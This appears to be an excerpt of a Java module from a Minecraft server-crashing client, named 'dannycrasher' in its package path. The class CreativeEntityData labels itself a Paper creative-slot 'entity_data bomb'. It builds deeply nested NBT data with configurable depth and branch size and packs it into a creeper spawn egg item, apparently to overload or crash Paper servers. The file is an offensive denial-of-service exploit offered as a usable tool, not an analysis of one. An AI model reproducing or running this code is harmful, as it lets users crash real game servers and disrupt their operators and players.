...
import me.dannycrasher.client.protocol.components.data.impl.DataEntityData;
...
public class CreativeEntityData extends Module {
	private ScheduledExecutorService executorService;

	public CreativeEntityData() {
		super("CreativeEntityData", "Paper creative-slot spawn-egg entity_data bomb (requires creative)", ModuleType.PAPER);
	...
	public void executeModule(ModuleContext context) {
		...
		components.put(new DataEntityData(NbtBombTrees.entityBomb(
				context.getInt("nbtDepth"),
				context.getInt("branchSize"),
				"minecraft:creeper"
		)));
		ItemStack item = new ItemStack(ItemType.CREEPER_SPAWN_EGG.getId(protocol), 1, components);
